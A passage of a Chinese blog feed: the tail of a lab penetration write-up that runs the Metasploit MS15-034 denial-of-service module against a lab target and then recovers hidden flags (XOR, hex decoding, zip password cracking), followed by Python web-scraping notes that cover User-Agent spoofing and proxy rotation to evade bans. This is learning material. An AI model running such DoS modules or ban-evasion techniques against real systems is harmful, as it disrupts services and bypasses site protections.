auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br></pre></td></tr></table></figure><p>结果靶机没有蓝屏，而是立即重启了，也蛮有趣的</p><h1>三、后渗透阶段（flag挖掘）</h1><p>很像是在打CTF，做得蛮开心的~</p><h2 id="1-the-joker"><a class="header-anchor" href="#1-the-joker">¶</a>1. the_joker</h2><ol><li><p>发现80端口是打开的，用浏览器打开，不难从html页面发现隐藏的HEX代码，通过<code>curl http://10.0.2.4/ &gt; data.html cat data.html | perl -ne 'print $1 if(/value\=\&quot;(\w+)\&quot;\&gt;/g)' &gt; data.hex</code> 获得hex.txt见附件</p></li><li><p>不难猜想可由hex转图片，<a href="http://xn--hex2png-lr4kf0uz1a093n.py">于是写出hex2png.py</a>，获得flag。</p></li><li><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f, <span class="built_in">open</span>(<span class="string">&#x27;data.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> fout:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        fout.write(binascii.unhexlify(line))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/21KMvxdUwutezon.png" alt="joker"></p><h2 id="2-Ace-of-Hearts"><a class="header-anchor" href="#2-Ace-of-Hearts">¶</a>2. Ace_of_Hearts</h2><ol><li>打开目录不难找到一张普通的红桃A，文件异常之大，不难发现端倪，可能是多文件隐藏。</li><li>查看二进制格式，把第一个jpg文件删去，即得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/nMzVcvW26uNOpyC.png" alt="ace_of_hearts"></p><h2 id="3-Jack-of-Hearts"><a class="header-anchor" href="#3-Jack-of-Hearts">¶</a>3.  Jack_of_Hearts</h2><ol><li><p>不难在document目录下发现Jack_of_Hearts.docx，考虑单文件docx中的PNG隐藏文件</p></li><li><p>将docx文件后缀改为.zip就会得到一个压缩文件，在\word\media中就能找到隐藏的图像flag文件）</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/kmhuVc8ApNgj3yM.png" alt="jack_of_hearts"></p><h2 id="4-Six-of-Diamonds"><a class="header-anchor" href="#4-Six-of-Diamonds">¶</a>4. Six_of_Diamonds</h2><ol><li>在C:\inetpub\wwwroot目录下不难找到six_of_diamonds压缩包，发现经过加密</li><li>首先考虑是不是伪加密，将全局方式位标记改为 00 00，未能成功打开，说明确实有密码</li><li>使用ARCHPR进行爆破，密码为vagrant，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/MxJXZNs3TrvQhou.png" alt="six_of_diamonds"></p><h2 id="5-King-of-Diamonds"><a class="header-anchor" href="#5-King-of-Diamonds">¶</a>5. King_of_Diamonds</h2><p>在C:\wamp\www\wordpress\wp-content\uploads\2017\09目录下直接找到King_of_Diamonds.png</p><p><img src="https://s2.loli.net/2021/12/17/cZ3u2kmh9aUxvg4.png" alt="king_of_damonds"></p><h2 id="6-Three-of-Spades"><a class="header-anchor" href="#6-Three-of-Spades">¶</a>6. Three_of_Spades</h2><ol><li><p>此图片我一通好找，突然想起可能是被隐藏了，最终在C:\windows目录下找到了</p></li><li><p>但是仍然无法打开，二进制格式打开根据文件头猜测文件被处理过，对文件异或操作，获得正常png格式</p></li><li><p>处理图片的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">_<span class="keyword">in</span> = <span class="string">&#x27;three_of_spades.png&#x27;</span>;</span><br><span class="line">_out = _<span class="keyword">in</span> + <span class="string">&#x27;.out&#x27;</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(_<span class="keyword">in</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    b[i] ^= <span class="number">0x0f</span></span><br><span class="line"><span class="built_in">open</span>(_out, <span class="string">&#x27;wb&#x27;</span>).write(b)</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/4yeYRt9ZzgNpn8W.png" alt="three_of_spades"></p><h2 id="7-Seven-of-Spades"><a class="header-anchor" href="#7-Seven-of-Spades">¶</a>7. Seven_of_Spades</h2><ol><li>在Libraries\Documents目录下发现Seven of Spades.pdf，不难想到是隐藏在文件里了，使用pdf-parser即可获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/gLJlobmzvewOQI1.png" alt="seven_of_spades"></p><h2 id="8-Four-of-Clubs"><a class="header-anchor" href="#8-Four-of-Clubs">¶</a>8. Four_of_Clubs</h2><ol><li>类似7，Libraries\Music目录下找到Four_of_Clubs.wav，使用binwalk分离其中的flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/PWTZSrDiycuUKgX.png" alt="four_of-clubs"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫笔记</title>
      <link href="/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/22/Python%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1>使用requests和bs4爬取新东方作文</h1><p>其实这是当时学爬虫的最初动力，爬点范文（doge）<br>技术路线的学习都记录在下面，深感博客杂乱不完整，试图整理了一遍。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：访问 url 的网页，获取网页内容并返回</span></span><br><span class="line"><span class="string">    参数：目标网页的 url</span></span><br><span class="line"><span class="string">    返回：目标网页的 html 内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span>(<span class="params">html</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：解析 HTML 网页，获取新闻的文章内容</span></span><br><span class="line"><span class="string">    参数：html 网页内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_html = html.replace(<span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(new_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取文章 内容</span></span><br><span class="line">    temp = bsobj.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_stem-text__3Vgg5&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> temp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        text = temp.find(<span class="string">&#x27;p&#x27;</span>).get_text()</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span>(<span class="params">content, path, filename</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：将文章内容 content 保存到本地文件中</span></span><br><span class="line"><span class="string">    参数：要保存的内容，路径，文件名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 如果没有该文件夹，则自动生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.makedirs(path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path + filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPageList</span>(<span class="params">pageUrl</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：获取文章链接列表</span></span><br><span class="line"><span class="string">    参数：文章链接</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    html = fetchUrl(pageUrl)</span><br><span class="line">    bsobj = bs4.BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    pageList = bsobj.find_all(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;style_question-item-content__zwx24&#x27;</span>&#125;)</span><br><span class="line">    linkList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> pageList:</span><br><span class="line">        temp = page.find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        link = temp[<span class="string">&quot;href&quot;</span>]</span><br><span class="line">        url = <span class="string">&quot;https://liuxue.koolearn.com&quot;</span> + link</span><br><span class="line">        linkList.append(url)</span><br><span class="line">    <span class="keyword">return</span> linkList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_article</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    功能：爬取网页文章，并保存在 指定目录下</span></span><br><span class="line"><span class="string">    参数：文件保存的根目录</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    path = <span class="string">&quot;D:/TOEFL/Writing/&quot;</span></span><br><span class="line">    baseurl = <span class="string">&quot;https://liuxue.koolearn.com/toefl/write-0-&quot;</span></span><br><span class="line">    suffix = <span class="string">&quot;-0/&quot;</span></span><br><span class="line">    var = <span class="number">997</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> var &gt;= <span class="number">953</span>:</span><br><span class="line">        page_url = baseurl + <span class="built_in">str</span>(var) + suffix</span><br><span class="line">        articles = getPageList(page_url)</span><br><span class="line">        <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">            <span class="comment"># 获取新闻文章内容</span></span><br><span class="line">            html = fetchUrl(article)</span><br><span class="line">            content = getContent(html)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 生成文件名</span></span><br><span class="line">                fileName = <span class="built_in">str</span>(cnt) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">                saveFile(content, path, fileName)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        var -= <span class="number">11</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cnt = download_article()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;all done!\n&quot;</span> + <span class="built_in">str</span>(cnt))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>基础知识：http协议与url</h1><h2 id="什么是http和https协议："><a class="header-anchor" href="#什么是http和https协议：">¶</a>什么是http和https协议：</h2><p>HTTP协议：全称是<code>HyperText Transfer Protocol</code>，中文意思是超文本传输协议，是一种发布和接收HTML页面的方法。服务器端口号是<code>80</code>端口。<br>HTTPS协议：是HTTP协议的加密版本，在HTTP下加入了SSL层。服务器端口号是<code>443</code>端口。</p><p>在浏览器中发送一个http请求的过程：</p><ol><li>当用户在浏览器的地址栏中输入一个URL并按回车键之后，浏览器会向HTTP服务器发送HTTP请求。HTTP请求主要分为“Get”和“Post”两种方法。</li><li>当我们在浏览器输入URL <a href="http://www.baidu.com">http://www.baidu.com</a> 的时候，浏览器发送一个Request请求去获取 <a href="http://www.baidu.com">http://www.baidu.com</a> 的html文件，服务器把Response文件对象发送回给浏览器。</li><li>浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如Images文件，CSS文件，JS文件。 浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。</li><li>当所有的文件都下载成功后，网页会根据HTML语法结构，完整的显示出来了。</li></ol><h2 id="url详解："><a class="header-anchor" href="#url详解：">¶</a>url详解：</h2><p><code>URL</code>是<code>Uniform Resource Locator</code>的简写，统一资源定位符。<br>一个<code>URL</code>由以下几部分组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://host:port/path/?query-string=xxx#anchor</span><br></pre></td></tr></table></figure><ul><li><strong>scheme</strong>：代表的是访问的协议，一般为<code>http</code>或者<code>https</code>以及<code>ftp</code>等。</li><li><strong>host</strong>：主机名，域名，比如<code>www.baidu.com</code>。</li><li><strong>port</strong>：端口号。当你访问一个网站的时候，浏览器默认使用80端口。</li><li><strong>path</strong>：查找路径。比如：<code>www.jianshu.com/trending/now</code>，后面的<code>trending/now</code>就是<code>path</code>。</li><li><strong>query-string</strong>：查询字符串，比如：<code>www.baidu.com/s?wd=python</code>，后面的<code>wd=python</code>就是查询字符串。</li><li><strong>anchor</strong>：锚点，后台一般不用管，前端用来做页面定位的。</li></ul><p>==在浏览器中请求一个<code>url</code>，浏览器会对这个url进行一个编码。除英文字母，数字和部分符号外，其他的全部使用百分号+十六进制码值进行编码。==</p><h2 id="常用的请求方法："><a class="header-anchor" href="#常用的请求方法：">¶</a>常用的请求方法：</h2><p>在<code>Http</code>协议中，定义了八种请求方法。这里介绍两种常用的请求方法，分别是<code>get</code>请求和<code>post</code>请求。</p><ol><li><code>get</code>请求：一般情况下，只从服务器获取数据下来，并不会对服务器资源产生任何影响的时候会使用<code>get</code>请求。</li><li><code>post</code>请求：向服务器发送数据（登录）、上传文件等，会对服务器资源产生影响的时候会使用<code>post</code>请求。<br>以上是在网站开发中常用的两种方法。并且一般情况下都会遵循使用的原则。但是有的网站和服务器为了做反爬虫机制，也经常会不按常理出牌，有可能一个应该使用<code>get</code>方法的请求就一定要改成<code>post</code>请求，这个要视情况而定。</li></ol><h2 id="请求头常见参数："><a class="header-anchor" href="#请求头常见参数：">¶</a>请求头常见参数：</h2><p>在<code>http</code>协议中，向服务器发送一个请求，数据分为三部分，第一个是把数据放在url中，第二个是把数据放在<code>body</code>中（在<code>post</code>请求中），第三个就是把数据放在<code>head</code>中。这里介绍在网络爬虫中经常会用到的一些请求头参数：</p><ol><li><code>User-Agent</code>：浏览器名称。这个在网络爬虫中经常会被使用到。请求一个网页的时候，服务器通过这个参数就可以知道这个请求是由哪种浏览器发送的。如果我们是通过爬虫发送请求，那么我们的<code>User-Agent</code>就是<code>Python</code>，这对于那些有反爬虫机制的网站来说，可以轻易的判断你这个请求是爬虫。因此我们要经常设置这个值为一些浏览器的值，来伪装我们的爬虫。</li><li><code>Referer</code>：表明当前这个请求是从哪个<code>url</code>过来的。这个一般也可以用来做反爬虫技术。如果不是从指定页面过来的，那么就不做相关的响应。</li><li><code>Cookie</code>：<code>http</code>协议是无状态的。也就是同一个人发送了两次请求，服务器没有能力知道这两个请求是否来自同一个人。因此这时候就用<code>cookie</code>来做标识。一般如果想要做登录后才能访问的网站，那么就需要发送<code>cookie</code>信息了。</li></ol><h2 id="常见响应状态码："><a class="header-anchor" href="#常见响应状态码：">¶</a>常见响应状态码：</h2><ol><li><code>200</code>：请求正常，服务器正常的返回数据。</li><li><code>301</code>：永久重定向。比如在访问<code>www.jingdong.com</code>的时候会重定向到<code>www.jd.com</code>。</li><li><code>302</code>：临时重定向。比如在访问一个需要登录的页面的时候，而此时没有登录，那么就会重定向到登录页面。</li><li><code>400</code>：请求的<code>url</code>在服务器上找不到。换句话说就是请求<code>url</code>错误。</li><li><code>403</code>：服务器拒绝访问，权限不够。</li><li><code>500</code>：服务器内部错误。可能是服务器出现<code>bug</code>了。</li></ol><h1>urllib库</h1><p><code>urllib</code>库是<code>Python</code>中一个最基本的网络请求库。可以模拟浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><h2 id="urlopen函数："><a class="header-anchor" href="#urlopen函数：">¶</a>urlopen函数：</h2><p>在<code>Python3</code>的<code>urllib</code>库中，所有和网络请求相关的方法，都被集到<code>urllib.request</code>模块下面了，以先来看下<code>urlopen</code>函数基本的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">resp = request.urlopen(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><p>实际上，使用浏览器访问百度，右键查看源代码。你会发现，跟我们刚才打印出来的数据是一模一样的。也就是说，上面的三行代码就已经帮我们把百度的首页的全部代码爬下来了。一个基本的url请求对应的python代码真的非常简单。<br>以下对<code>urlopen</code>函数的进行详细讲解：</p><ol><li><code>url</code>：请求的url。</li><li><code>data</code>：请求的<code>data</code>，如果设置了这个值，那么将变成<code>post</code>请求。</li><li>返回值：返回值是一个<code>http.client.HTTPResponse</code>对象，这个对象是一个类文件句柄对象。有<code>read(size)</code>、<code>readline</code>、<code>readlines</code>以及<code>getcode</code>等方法。</li></ol><h2 id="urlretrieve函数："><a class="header-anchor" href="#urlretrieve函数：">¶</a>urlretrieve函数：</h2><p>这个函数可以方便的将网页上的一个文件保存到本地。以下代码可以非常方便的将百度的首页下载到本地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">request.urlretrieve(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="string">&#x27;baidu.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="urlencode函数："><a class="header-anchor" href="#urlencode函数：">¶</a>urlencode函数：</h2><p>用浏览器发送请求的时候，==如果url中包含了中文或者其他特殊字符==，那么浏览器会自动的给我们进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这时候就应该使用<code>urlencode</code>函数来实现。<code>urlencode</code>可以把字典数据转换为<code>URL</code>编码的数据。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">data = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;爬虫基础&#x27;</span>,<span class="string">&#x27;greet&#x27;</span>:<span class="string">&#x27;hello world&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">100</span>&#125;</span><br><span class="line">qs = parse.urlencode(data)</span><br><span class="line"><span class="built_in">print</span>(qs)</span><br></pre></td></tr></table></figure><h2 id="parse-qs函数："><a class="header-anchor" href="#parse-qs函数：">¶</a>parse_qs函数：</h2><p>可以将经过编码后的url参数进行解码。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">qs = <span class="string">&quot;name=%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80&amp;greet=hello+world&amp;age=100&quot;</span></span><br><span class="line"><span class="built_in">print</span>(parse.parse_qs(qs))</span><br></pre></td></tr></table></figure><h2 id="urlparse和urlsplit："><a class="header-anchor" href="#urlparse和urlsplit：">¶</a>urlparse和urlsplit：</h2><p>有时候拿到一个url，想要对这个url中的各个组成部分进行分割，那么这时候就可以使用<code>urlparse</code>或者是<code>urlsplit</code>来进行分割。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?username=zhiliao&#x27;</span></span><br><span class="line"></span><br><span class="line">result = parse.urlsplit(url)</span><br><span class="line"><span class="comment"># result = parse.urlparse(url)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;scheme:&#x27;</span>,result.scheme)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;netloc:&#x27;</span>,result.netloc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;path:&#x27;</span>,result.path)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;query:&#x27;</span>,result.query)</span><br></pre></td></tr></table></figure><p><code>urlparse</code>和<code>urlsplit</code>基本上是一模一样的。==唯一不一样的地方是，<code>urlparse</code>里面多了一个<code>params</code>属性，而<code>urlsplit</code>没有这个<code>params</code>属性==。比如有一个<code>url</code>为：<code>url = 'http://www.baidu.com/s;hello?wd=python&amp;username=abc#1'</code>，那么<code>urlparse</code>可以获取到<code>hello</code>，而<code>urlsplit</code>不可以获取到。<code>url</code>中的<code>params</code>也用得比较少。</p><h2 id="request-Request类："><a class="header-anchor" href="#request-Request类：">¶</a>request.Request类：</h2><p>如果想要在请求的时候增加一些请求头，那么就必须使用<code>request.Request</code>类来实现。比如要增加一个<code>User-Agent</code>，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&quot;http://www.baidu.com/&quot;</span>,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="ProxyHandler处理器（代理设置）"><a class="header-anchor" href="#ProxyHandler处理器（代理设置）">¶</a>ProxyHandler处理器（代理设置）</h2><p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP的访问。<br>所以我们可以设置一些代理服务器，每隔一段时间换一个代理，就算IP被禁止，依然可以换个IP继续爬取。<br>urllib中通过ProxyHandler来设置使用代理服务器，下面代码说明如何使用自定义opener来使用代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是没有使用代理的</span></span><br><span class="line"><span class="comment"># resp = request.urlopen(&#x27;http://httpbin.org/get&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp.read().decode(&quot;utf-8&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个是使用了代理的</span></span><br><span class="line">handler = request.ProxyHandler(&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;218.66.161.88:31769&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line">req = request.Request(<span class="string">&quot;http://httpbin.org/ip&quot;</span>)</span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h2 id="“科学上网”代理"><a class="header-anchor" href="#“科学上网”代理">¶</a>“科学上网”代理</h2><p>查看当前使用的代理ip以及开放的端口，开放端口用<code>shodan</code>一般就可以搜到，也可以用<code>nmap</code>去扫描，VPN协议端口有三类，略去</p><h1>cookie相关：</h1><h2 id="cookie的格式："><a class="header-anchor" href="#cookie的格式：">¶</a>cookie的格式：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: NAME=VALUE；Expires/Max-age=DATE；Path=PATH；Domain=DOMAIN_NAME；SECURE</span><br></pre></td></tr></table></figure><p>参数意义：</p><ul><li>NAME：cookie的名字。</li><li>VALUE：cookie的值。</li><li>Expires：cookie的过期时间。</li><li>Path：cookie作用的路径。</li><li>Domain：cookie作用的域名。</li><li>SECURE：是否只在https协议下起作用。</li></ul><h2 id="使用cookielib库和HTTPCookieProcessor模拟登录："><a class="header-anchor" href="#使用cookielib库和HTTPCookieProcessor模拟登录：">¶</a>使用cookielib库和HTTPCookieProcessor模拟登录：</h2><p>Cookie 